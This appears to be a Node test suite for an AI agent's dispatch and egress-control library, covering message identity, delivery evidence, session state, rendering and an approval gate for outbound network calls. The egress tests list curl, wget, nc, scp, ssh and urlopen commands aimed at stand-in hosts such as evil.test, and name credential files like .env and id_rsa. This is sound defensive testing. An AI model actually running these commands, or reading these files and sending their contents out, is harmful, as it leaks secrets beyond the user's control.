/**
 * Self-check for lib/dispatch-core.js. Runs under plain Node with no host
 * services: builds synthetic session logs and asserts the ported judgment.
 */
import assert from 'node:assert/strict'
import {
  REASON, DispatchCoreError, DISPATCH_TOOL,
  deriveIdentity, deriveMessageId, buildRelayMessage, findDispatchCall, argumentsMatch,
  currentSelection, foldInbox, pendingUserWait, deliveryEvidence,
  decideTargetState, isReceivable, selectionMismatch,
  renderSelection, renderDispatchReceipt, renderInspection, summarizeEvent,
  inspectEgress, touchesProtected,
} from '../lib/dispatch-core.js'

let passed = 0
function check(name, fn) {
  try {
    fn()
    passed += 1
  } catch (error) {
    console.error(`FAIL ${name}: ${error?.message ?? error}`)
    process.exitCode = 1
  }
}

/* ---------- identity ---------- */
check('identity is stable for the same call', () => {
  assert.equal(deriveIdentity({ sessionId: 's', callId: 'c', kind: 'direct' }), deriveIdentity({ sessionId: 's', callId: 'c', kind: 'direct' }))
})
check('identity separates kind, call, and session', () => {
  const base = deriveIdentity({ sessionId: 's', callId: 'c', kind: 'direct' })
  assert.notEqual(base, deriveIdentity({ sessionId: 's', callId: 'c', kind: 'ptc' }))
  assert.notEqual(base, deriveIdentity({ sessionId: 's', callId: 'c2', kind: 'direct' }))
  assert.notEqual(base, deriveIdentity({ sessionId: 's2', callId: 'c', kind: 'direct' }))
})

/* ---------- messageId ---------- */
const baseFacts = {
  identity: 'id1', workspaceId: 'w', sessionId: 'target', senderSessionId: 'shadow',
  provider: 'p', model: 'm', content: 'hello',
}
check('messageId is deterministic', () => {
  assert.equal(deriveMessageId(baseFacts), deriveMessageId(baseFacts))
  assert.match(deriveMessageId(baseFacts), /^shadow-message-[0-9a-f]{64}$/)
})
check('messageId changes when the target changes', () => {
  assert.notEqual(deriveMessageId(baseFacts), deriveMessageId({ ...baseFacts, sessionId: 'other' }))
})
check('messageId changes when the content or model changes', () => {
  assert.notEqual(deriveMessageId(baseFacts), deriveMessageId({ ...baseFacts, content: 'hello!' }))
  assert.notEqual(deriveMessageId(baseFacts), deriveMessageId({ ...baseFacts, model: 'm2' }))
  assert.notEqual(deriveMessageId(baseFacts), deriveMessageId({ ...baseFacts, reasoningEffort: 'high' }))
})
check('messageId normalizes an empty effort to absent', () => {
  assert.equal(deriveMessageId({ ...baseFacts, reasoningEffort: '' }), deriveMessageId(baseFacts))
})
check('messageId refuses a missing fact', () => {
  assert.throws(() => deriveMessageId({ ...baseFacts, content: '' }), (error) => error instanceof DispatchCoreError && error.code === REASON.identityConflict)
})

/* ---------- relay message ---------- */
check('relay message is frozen and carries the sender', () => {
  const message = buildRelayMessage({ messageId: 'shadow-message-x', content: 'go', senderSessionId: 'shadow-1' })
  assert.equal(message.id, 'shadow-message-x')
  assert.equal(message.role, 'user')
  assert.deepEqual(message.source, { kind: 'agent-message', form: 'relay', senderSessionId: 'shadow-1' })
  assert.ok(Object.isFrozen(message) && Object.isFrozen(message.content) && Object.isFrozen(message.content[0]) && Object.isFrozen(message.source))
})

/* ---------- call anchoring ---------- */
const callLog = [
  { type: 'assistant/message', seq: 3, data: { content: [{ type: 'tool-call', id: 'call-1', name: DISPATCH_TOOL, arguments: '{"workspaceId":"w","sessionId":"t","content":"go"}' }] } },
  { type: 'tool/call', seq: 4, data: { turn: 1, step: 0, callId: 'call-1', name: DISPATCH_TOOL, arguments: '{"workspaceId":"w","sessionId":"t","content":"go"}' } },
  { type: 'tool/ptc-dispatch-start', seq: 6, data: { rootCallId: 'call-1', parentCallId: 'call-1', subCallId: 'call-1:ptc:1', name: DISPATCH_TOOL, arguments: { workspaceId: 'w', sessionId: 't', content: 'go' } } },
]
check('findDispatchCall finds the direct call', () => {
  assert.deepEqual(findDispatchCall({ events: callLog, callId: 'call-1' }), { kind: 'direct', arguments: '{"workspaceId":"w","sessionId":"t","content":"go"}' })
})
check('findDispatchCall finds the ptc sub-call', () => {
  assert.deepEqual(findDispatchCall({ events: callLog, callId: 'call-1:ptc:1' }), { kind: 'ptc', arguments: { workspaceId: 'w', sessionId: 't', content: 'go' } })
})
check('findDispatchCall ignores other tools and reports absence', () => {
  assert.equal(findDispatchCall({ events: callLog, callId: 'nope' }), null)
  assert.equal(findDispatchCall({ events: [{ type: 'tool/call', seq: 1, data: { callId: 'x', name: 'read', arguments: '{}' } }], callId: 'x' }), null)
})

/* ---------- arguments matching (rc.3 logs raw JSON strings for direct calls) ---------- */
check('argumentsMatch: a raw JSON string matches its parsed object', () => {
  const raw = JSON.stringify({ workspaceId: 'w', sessionId: 't', content: 'go' })
  assert.equal(argumentsMatch(raw, { workspaceId: 'w', sessionId: 't', content: 'go' }), true)
  assert.equal(argumentsMatch(raw, { workspaceId: 'w', sessionId: 't', content: 'other' }), false)
})
check('argumentsMatch: an object record matches directly (ptc form)', () => {
  assert.equal(argumentsMatch({ workspaceId: 'w' }, { workspaceId: 'w' }), true)
  assert.equal(argumentsMatch({ workspaceId: 'w' }, { workspaceId: 'x' }), false)
})
check('argumentsMatch: unparseable text is compared as text', () => {
  assert.equal(argumentsMatch('{not json', '{not json'), true)
  assert.equal(argumentsMatch('{not json', {}), false)
})
check('argumentsMatch: an empty record matches the parser default', () => {
  assert.equal(argumentsMatch('', {}), true)
  assert.equal(argumentsMatch('{}', {}), true)
})

/* ---------- current selection ---------- */
check('selection: pending intent wins', () => {
  const events = [
    { type: 'request/header', seq: 1, data: { header: { config: { provider: 'p1', model: 'm1' } } } },
    { type: 'model/selection', seq: 2, data: { provider: 'p2', model: 'm2', reasoningEffort: 'high' } },
  ]
  assert.deepEqual(currentSelection(events), { provider: 'p2', model: 'm2', reasoningEffort: 'high' })
})
check('selection: a consuming request header retires the intent', () => {
  const events = [
    { type: 'model/selection', seq: 1, data: { provider: 'p2', model: 'm2' } },
    { type: 'request/header', seq: 2, data: { header: { config: { provider: 'p2', model: 'm2' } } } },
    { type: 'request/header', seq: 3, data: { header: { config: { provider: 'p3', model: 'm3' } } } },
  ]
  assert.deepEqual(currentSelection(events), { provider: 'p3', model: 'm3' })
})
check('selection: falls back to the last request header', () => {
  const events = [{ type: 'request/header', seq: 1, data: { header: { config: { provider: 'p', model: 'm', reasoningEffort: 'low' } } } }]
  assert.deepEqual(currentSelection(events), { provider: 'p', model: 'm', reasoningEffort: 'low' })
})
check('selection: null when the log records none', () => {
  assert.equal(currentSelection([{ type: 'user/message', seq: 1, data: {} }]), null)
  assert.equal(currentSelection([]), null)
})

/* ---------- inbox fold ---------- */
check('inbox: splices apply in order', () => {
  const events = [
    { type: 'agent/inbox/spliced', seq: 1, data: { target: 'next-turn', start: 0, inserted: [{ id: 'a' }, { id: 'b' }] } },
    { type: 'agent/inbox/spliced', seq: 2, data: { target: 'next-turn', start: 0, removedCount: 1, inserted: [] } },
    { type: 'agent/inbox/spliced', seq: 3, data: { target: 'next-step', start: 0, inserted: [{ id: 'c' }] } },
  ]
  const state = foldInbox(events)
  assert.deepEqual(state['next-turn'].map((m) => m.id), ['b'])
  assert.deepEqual(state['next-step'].map((m) => m.id), ['c'])
})
check('inbox: an invalid splice fails loud as unknown', () => {
  assert.throws(() => foldInbox([{ type: 'agent/inbox/spliced', seq: 1, data: { target: 'next-turn', start: 5, inserted: [] } }]),
    (error) => error instanceof DispatchCoreError && error.code === REASON.unknown)
})

/* ---------- waiting-user ---------- */
check('waiting-user: an open question blocks', () => {
  assert.equal(pendingUserWait([{ type: 'tool/call', seq: 1, data: { callId: 'q1', name: 'ask_user_question', arguments: {} } }]), true)
})
check('waiting-user: a result releases the question', () => {
  const events = [
    { type: 'tool/call', seq: 1, data: { callId: 'q1', name: 'ask_user_question', arguments: {} } },
    { type: 'tool/result', seq: 2, data: { message: { toolCallId: 'q1', content: [], isError: false } } },
  ]
  assert.equal(pendingUserWait(events), false)
})
check('waiting-user: an undecided approval blocks', () => {
  const events = [
    { type: 'approval/asked', seq: 1, data: { id: 'a1', toolName: 'x' } },
  ]
  assert.equal(pendingUserWait(events), true)
  events.push({ type: 'approval/decided', seq: 2, data: { id: 'a1', outcome: 'allowed-once' } })
  assert.equal(pendingUserWait(events), false)
})

/* ---------- delivery evidence ---------- */
const targetMessage = buildRelayMessage({ messageId: 'shadow-message-x', content: 'go', senderSessionId: 'shadow-1' })
function evidenceLog(extra = []) {
  return [
    { type: 'agent/inbox/spliced', seq: 2, data: { target: 'next-turn', start: 0, inserted: [targetMessage] } },
    { type: 'user/message', seq: 3, data: targetMessage },
    { type: 'request/header', seq: 4, data: { header: { config: { provider: 'p', model: 'm' } } } },
    ...extra,
  ]
}
check('evidence: records the admitted request', () => {
  const evidence = deliveryEvidence({ events: evidenceLog([{ type: 'assistant/message', seq: 5, data: {} }]), inheritedEventCount: 0, message: targetMessage })
  assert.deepEqual(evidence, {
    inboxSeq: 2, userSeq: 3,
    execution: { selection: { provider: 'p', model: 'm' }, requestHeaderSeq: 4, settled: true },
  })
})
check('evidence: unsettled when the turn ends before any assistant output', () => {
  const evidence = deliveryEvidence({ events: evidenceLog([{ type: 'step/end', seq: 5, data: {} }]), inheritedEventCount: 0, message: targetMessage })
  assert.deepEqual(evidence.execution, { selection: { provider: 'p', model: 'm' }, requestHeaderSeq: 4, settled: false })
})
check('evidence: null when the message never entered', () => {
  assert.equal(deliveryEvidence({ events: [{ type: 'user/message', seq: 1, data: { id: 'other' } }], inheritedEventCount: 0, message: targetMessage }), null)
})
check('evidence: inherited splices do not count as this session delivery', () => {
  const events = [{ type: 'agent/inbox/spliced', seq: 0, data: { target: 'next-turn', start: 0, inserted: [targetMessage] } }]
  assert.equal(deliveryEvidence({ events, inheritedEventCount: 1, message: targetMessage }), null)
})
check('evidence: same id with different content fails loud', () => {
  const forged = { ...targetMessage, content: [{ type: 'text', text: 'tampered' }] }
  const events = [{ type: 'agent/inbox/spliced', seq: 1, data: { target: 'next-turn', start: 0, inserted: [forged] } }]
  assert.throws(() => deliveryEvidence({ events, inheritedEventCount: 0, message: targetMessage }),
    (error) => error instanceof DispatchCoreError && error.code === REASON.identityConflict)
})
check('evidence: a surfaced message with a different source fails loud', () => {
  const events = [{ type: 'agent/inbox/spliced', seq: 1, data: { target: 'next-turn', start: 0, inserted: [targetMessage] } },
    { type: 'user/message', seq: 2, data: { ...targetMessage, source: { kind: 'user-rpc' } } }]
  assert.throws(() => deliveryEvidence({ events, inheritedEventCount: 0, message: targetMessage }),
    (error) => error instanceof DispatchCoreError && error.code === REASON.identityConflict)
})

/* ---------- target state ---------- */
check('state: cold, busy, waiting, pending, archived, subagent, unknown', () => {
  assert.equal(decideTargetState({ live: false, archived: false, subagent: false }), 'cold')
  assert.equal(decideTargetState({ live: true, status: 'running', archived: false, subagent: false, waitingUser: false, inboxPending: false }), REASON.busy)
  assert.equal(decideTargetState({ live: true, status: 'idle', archived: false, subagent: false, waitingUser: true, inboxPending: false }), REASON.waitingUser)
  assert.equal(decideTargetState({ live: true, status: 'idle', archived: false, subagent: false, waitingUser: false, inboxPending: true }), REASON.pending)
  assert.equal(decideTargetState({ live: true, status: 'idle', archived: true, subagent: false }), REASON.archived)
  assert.equal(decideTargetState({ live: true, status: 'idle', archived: false, subagent: true }), REASON.subagent)
  assert.equal(decideTargetState({ live: false, archived: true, subagent: false }), REASON.archived)
  assert.equal(decideTargetState({ live: true, readFailed: true }), REASON.unknown)
})
check('state: durable blockers outrank liveness', () => {
  assert.equal(decideTargetState({ live: false, archived: false, subagent: false, waitingUser: true }), REASON.waitingUser)
  assert.equal(decideTargetState({ live: false, archived: false, subagent: false, inboxPending: true }), REASON.pending)
  assert.equal(decideTargetState({ live: true, status: 'running', archived: false, subagent: false, inboxPending: true }), REASON.pending)
  assert.equal(decideTargetState({ live: false, status: 'running', archived: false, subagent: false }), REASON.cold)
})
check('state: only idle and cold are receivable', () => {
  assert.equal(isReceivable('idle'), true)
  assert.equal(isReceivable('cold'), true)
  for (const state of [REASON.busy, REASON.archived, REASON.waitingUser, REASON.pending, REASON.subagent, REASON.unknown]) {
    assert.equal(isReceivable(state), false, state)
  }
})

/* ---------- selection mismatch ---------- */
check('mismatch: compares the fields a request runs with', () => {
  assert.equal(selectionMismatch({ provider: 'p', model: 'm' }, { provider: 'p', model: 'm' }), false)
  assert.equal(selectionMismatch({ provider: 'p', model: 'm' }, { provider: 'p', model: 'm', reasoningEffort: 'high' }), true)
  assert.equal(selectionMismatch(null, { provider: 'p', model: 'm' }), true)
})

/* ---------- rendering ---------- */
check('render: selection formats', () => {
  assert.equal(renderSelection(null), '(unchanged)')
  assert.equal(renderSelection({ provider: 'p', model: 'm' }), 'p/m')
  assert.equal(renderSelection({ provider: 'p', model: 'm', reasoningEffort: 'high' }), 'p/m/high')
})
check('render: receipt carries the pinned labels', () => {
  const text = renderDispatchReceipt({
    status: 'durable', target: 'w/t', messageId: 'shadow-message-x',
    selected: { provider: 'p', model: 'm' },
    evidence: { inboxSeq: 2, userSeq: 3, execution: { selection: { provider: 'p', model: 'm' }, requestHeaderSeq: 4, settled: true } },
  })
  assert.match(text, /^shadow_dispatch -> durable\n/)
  assert.match(text, /target: w\/t\n/)
  assert.match(text, /message: shadow-message-x\n/)
  assert.match(text, /selected: p\/m\n/)
  assert.match(text, /evidence: inbox@2 user@3 execution@4 settled=true$/)
  assert.doesNotMatch(text, /reason:/)
})
check('render: unknown forbids the same-arguments retry', () => {
  const text = renderDispatchReceipt({ status: 'unknown', target: 'w/t', selected: null, evidence: null, reason: 'lost confirmation after send' })
  assert.match(text, /shadow_dispatch -> unknown/)
  assert.match(text, /reason: lost confirmation after send/)
  assert.match(text, /do not retry with the same arguments/)
})
check('render: mismatch is reported without a silent switch-back', () => {
  const text = renderDispatchReceipt({
    status: 'durable', selected: { provider: 'p', model: 'm' }, executedSelection: { provider: 'p', model: 'm2' },
    evidence: { inboxSeq: 1, userSeq: 2, execution: null }, modelMismatch: true,
  })
  assert.match(text, /mismatch: the target ran p\/m2; it was not switched back/)
})
check('render: inspection shows state, model, and the event page', () => {
  const text = renderInspection({
    state: 'idle', target: 'w/t', probed: true, cwd: 'D:\\proj', model: { provider: 'p', model: 'm' }, asOfSeq: 9,
    events: [summarizeEvent({ type: 'user/message', seq: 8, data: { id: 'x' } })],
  })
  assert.match(text, /^shadow_inspect -> idle\n/)
  assert.match(text, /model: p\/m\n/)
  assert.match(text, /asOfSeq: 9\n/)
  assert.match(text, /events \(1\):\n#8 user\/message /)
})
check('render: a paged inspection says how much is left and where the end is', () => {
  const text = renderInspection({
    state: 'idle', target: 'w/t', probed: true, cwd: 'D:\\p', model: null, asOfSeq: 90,
    events: ['#11 a', '#12 b'],
    eventPage: { total: 40, afterSeq: 10, lastSeq: 90, limit: 2 },
  })
  assert.match(text, /events \(2 of 40 after seq 10; last seq is 90\):/)
  assert.match(text, /\(38 more: raise limit, or jump near the end with afterSeq 88\)/)
})
check('render: a complete page needs no "more" line', () => {
  const text = renderInspection({
    state: 'idle', target: 'w/t', probed: true, cwd: 'D:\\p', model: null, asOfSeq: 12,
    events: ['#11 a', '#12 b'],
    eventPage: { total: 2, afterSeq: 10, lastSeq: 12, limit: 20 },
  })
  assert.match(text, /events \(2 of 2 after seq 10; last seq is 12\):/)
  assert.doesNotMatch(text, /more:/)
})
check('render: a refusal before the read omits the probe lines', () => {
  const text = renderInspection({ state: REASON.sessionNotFound, target: 'w/t', reason: 'no Session "t" exists' })
  assert.match(text, /^shadow_inspect -> session-not-found\n/)
  assert.doesNotMatch(text, /cwd:/)
  assert.doesNotMatch(text, /model:/)
  assert.doesNotMatch(text, /asOfSeq:/)
})
check('render: inspection reports an unreadable target with its reason', () => {
  const text = renderInspection({ state: REASON.unknown, target: 'w/t', model: null, asOfSeq: -1, reason: 'session has no readable log' })
  assert.match(text, /shadow_inspect -> unknown/)
  assert.match(text, /reason: session has no readable log/)
})
check('render: a long event summary is bounded', () => {
  const line = summarizeEvent({ type: 'tool/result', seq: 1, data: { blob: 'x'.repeat(5000) } })
  assert.ok(line.length < 260, `summary too long: ${line.length}`)
})

/* ---------- egress rule (destination, never payload) ---------- */
check('egress: an unlisted external host needs approval', () => {
  const v = inspectEgress({ toolName: 'web_fetch', args: { url: 'https://example.com/x' }, allowlist: [] })
  assert.equal(v?.host, 'example.com')
})
check('egress: allowlisted hosts and subdomains pass', () => {
  assert.equal(inspectEgress({ toolName: 'web_fetch', args: { url: 'https://example.com/x' }, allowlist: ['example.com'] }), undefined)
  assert.equal(inspectEgress({ toolName: 'web_fetch', args: { url: 'https://api.example.com/x' }, allowlist: ['.example.com'] }), undefined)
})
check('egress: loopback never asks', () => {
  for (const url of ['http://127.0.0.1:8080/x', 'http://localhost/x', 'http://[::1]:9/x']) {
    assert.equal(inspectEgress({ toolName: 'web_fetch', args: { url }, allowlist: [] }), undefined, url)
  }
})
check('egress: credentials and ports are stripped before matching', () => {
  const v = inspectEgress({ toolName: 'web_fetch', args: { url: 'https://user:pw@evil.test:8443/x' }, allowlist: [] })
  assert.equal(v?.host, 'evil.test')
})
check('egress: a shell command only counts when it names a network client or a URL', () => {
  assert.equal(inspectEgress({ toolName: 'pwsh', args: { command: 'Get-ChildItem D:\\' }, allowlist: [] }), undefined)
  assert.equal(inspectEgress({ toolName: 'pwsh', args: { command: 'curl https://evil.test/a' }, allowlist: [] })?.host, 'evil.test')
  assert.equal(inspectEgress({ toolName: 'bash', args: { command: 'wget https://evil.test/a' }, allowlist: [] })?.host, 'evil.test')
})
check('egress: tools that cannot reach the network are never inspected', () => {
  // A document whose text contains a URL must not ask for permission.
  assert.equal(inspectEgress({ toolName: 'write', args: { file_path: 'a.md', content: 'see https://evil.test' }, allowlist: [] }), undefined)
  assert.equal(inspectEgress({ toolName: 'edit', args: { new_string: 'https://evil.test' }, allowlist: [] }), undefined)
  assert.equal(inspectEgress({ toolName: 'shadow_dispatch', args: { content: 'https://evil.test' }, allowlist: [] }), undefined)
})
check('egress: nested arguments are inspected', () => {
  const v = inspectEgress({ toolName: 'web_fetch', args: { request: { headers: [{ value: 'https://deep.test/x' }] } }, allowlist: [] })
  assert.equal(v?.host, 'deep.test')
})
check('egress: the payload is irrelevant, only the destination is', () => {
  const secret = 'sk-FAKE-not-a-real-key'
  assert.equal(inspectEgress({ toolName: 'web_fetch', args: { url: `https://ok.test/?k=${secret}` }, allowlist: ['ok.test'] }), undefined)
  assert.equal(inspectEgress({ toolName: 'web_fetch', args: { url: `https://bad.test/?k=${secret}` }, allowlist: ['ok.test'] })?.host, 'bad.test')
})

/* ---------- egress rule: destinations that cannot be read ---------- */
check('egress: a remote whose address is not in the arguments always asks', () => {
  const commands = [
    'git push origin main',
    'git push -u origin main',
    'git -c user.email=a@b.c push',
    'git remote add up https://github.com/org/repo',
    'npm publish',
    'npm run publish',
    'pnpm publish',
    'docker push img:tag',
    'docker login',
    'gh release create v1',
    'rsync -a ./ out:/srv',
    'scp a.txt host:/tmp',
    'sftp host',
    'ssh host',
    'telnet host',
    'nc host 4444',
    'aws s3 cp a.txt s3://bucket',
    'nslookup evil.test',
    'Resolve-DnsName evil.test',
  ]
  for (const command of commands) {
    // An allowlist cannot help: there is no host in the arguments to compare.
    const v = inspectEgress({ toolName: 'pwsh', args: { command }, allowlist: ['example.com', '.github.com'] })
    assert.equal(v?.opaque, true, command)
    assert.match(v?.reason ?? '', /cannot be checked/, command)
  }
})
check('egress: git clone over a readable URL is checked, the scp form asks', () => {
  assert.equal(inspectEgress({ toolName: 'pwsh', args: { command: 'git clone https://example.com/r.git' }, allowlist: ['example.com'] }), undefined)
  assert.equal(inspectEgress({ toolName: 'pwsh', args: { command: 'git clone git@github.com:org/repo.git' }, allowlist: ['.github.com'] })?.opaque, true)
  assert.equal(inspectEgress({ toolName: 'pwsh', args: { command: 'git fetch' }, allowlist: [] })?.opaque, true)
})
check('egress: chaining an allowlisted call onto a push cannot launder it', () => {
  // A push always asks (its URL form usually carries credentials); the curl half
  // cannot speak for it, and the segment split keeps them apart.
  assert.equal(inspectEgress({ toolName: 'pwsh', args: { command: 'git push origin main && curl https://ok.test/a' }, allowlist: ['ok.test'] })?.opaque, true)
  assert.equal(inspectEgress({ toolName: 'pwsh', args: { command: 'echo hi; git push' }, allowlist: [] })?.opaque, true)
  // fetch/pull/clone over a readable URL stay ordinary host checks — per segment.
  assert.equal(inspectEgress({ toolName: 'pwsh', args: { command: 'git pull https://ok.test/r.git && git push' }, allowlist: ['ok.test'] })?.opaque, true)
  assert.equal(inspectEgress({ toolName: 'pwsh', args: { command: 'git pull https://ok.test/r.git' }, allowlist: ['ok.test'] }), undefined)
})
check('egress: ordinary git and file commands never ask', () => {
  const quiet = ['git status', 'git log --oneline -3', 'git remote -v', 'git commit -m "fix the push hole"', 'echo the host is up', 'Get-Content hosts.txt', 'docker run --add-host db:1.2.3.4 img']
  for (const command of quiet) {
    assert.equal(inspectEgress({ toolName: 'pwsh', args: { command }, allowlist: [] }), undefined, command)
  }
})
check('egress: a network client without a readable URL asks instead of passing', () => {
  for (const command of ['curl evil.test/a', 'wget evil.test/a', 'curl evil.test/a && curl ok.test']) {
    const v = inspectEgress({ toolName: 'pwsh', args: { command }, allowlist: ['ok.test'] })
    assert.equal(v?.opaque, true, command)
    assert.match(v?.reason ?? '', /no URL/, command)
  }
})
check('egress: a destination on a non-HTTP protocol cannot be matched', () => {
  assert.equal(inspectEgress({ toolName: 'pwsh', args: { command: 'Start-Process ftp://evil.test/x' }, allowlist: [] })?.opaque, true)
  assert.equal(inspectEgress({ toolName: 'pwsh', args: { command: 'curl ftp://evil.test/x' }, allowlist: [] })?.opaque, true)
})
check('egress: a tool served by an external server always asks', () => {
  const v = inspectEgress({ toolName: 'mcp__github__create_issue', args: { title: 'x', body: 'y' }, allowlist: [] })
  assert.equal(v?.opaque, true)
  assert.equal(v?.host, 'an external tool server')
  assert.match(v?.reason ?? '', /served outside this process/)
  assert.equal(inspectEgress({ toolName: 'mcp-slack-post', args: { text: 'hi' }, allowlist: [] })?.opaque, true)
})
check('egress: a fetch whose destination cannot be read asks, a search waits for taint', () => {
  // A fetch names its destination in an argument; an unreadable one can only ask.
  assert.equal(inspectEgress({ toolName: 'web_fetch', args: { url: 'evil.test/x' }, allowlist: [] })?.opaque, true)
  assert.equal(inspectEgress({ toolName: 'web_fetch', args: { query: 'weather' }, allowlist: [] })?.opaque, true)
  // A search runs against the tool's own server: quiet until the turn is tainted.
  assert.equal(inspectEgress({ toolName: 'web_search', args: { query: 'weather' }, allowlist: [] }), undefined)
  assert.equal(inspectEgress({ toolName: 'web_search', args: { query: 'weather' }, allowlist: [], tainted: true })?.opaque, true)
})
check('egress: interpreters are scanned like shells', () => {
  assert.equal(inspectEgress({ toolName: 'python', args: { command: 'print(1)' }, allowlist: [] }), undefined)
  assert.equal(inspectEgress({ toolName: 'python', args: { command: 'urlopen("https://evil.test/x")' }, allowlist: [] })?.host, 'evil.test')
})

/* ---------- protected data (provenance, not content shape) ---------- */
check('protected: naming a protected path marks the turn', () => {
  assert.equal(touchesProtected({ args: { file_path: 'D:\\DSH\\.DSH\\.credentials.yaml' } }), '.credentials')
  assert.equal(touchesProtected({ args: { command: 'Get-Content .env' } }), '.env')
  assert.equal(touchesProtected({ args: { path: 'C:\\Users\\me\\.ssh\\id_rsa' } }), 'id_rsa')
})
check('protected: ordinary content is not marked', () => {
  assert.equal(touchesProtected({ args: { content: 'hello world' } }), undefined)
  assert.equal(touchesProtected({ args: { command: 'Get-ChildItem D:\\work' } }), undefined)
  assert.equal(touchesProtected({ args: {} }), undefined)
})
check('protected: an empty list disables the check', () => {
  assert.equal(touchesProtected({ args: { file_path: '.credentials.yaml' }, protectedPaths: [] }), undefined)
})
check('protected: a tainted turn loses the allowlist', () => {
  const args = { url: 'https://ok.test/x' }
  assert.equal(inspectEgress({ toolName: 'web_fetch', args, allowlist: ['ok.test'], tainted: false }), undefined)
  const v = inspectEgress({ toolName: 'web_fetch', args, allowlist: ['ok.test'], tainted: true })
  assert.equal(v?.host, 'ok.test')
  assert.match(v?.reason ?? '', /read protected data/)
})
check('protected: loopback still passes when tainted', () => {
  assert.equal(inspectEgress({ toolName: 'web_fetch', args: { url: 'http://127.0.0.1:9/x' }, tainted: true }), undefined)
})

console.log(`dispatch-core self-check: ${passed} checks passed`)
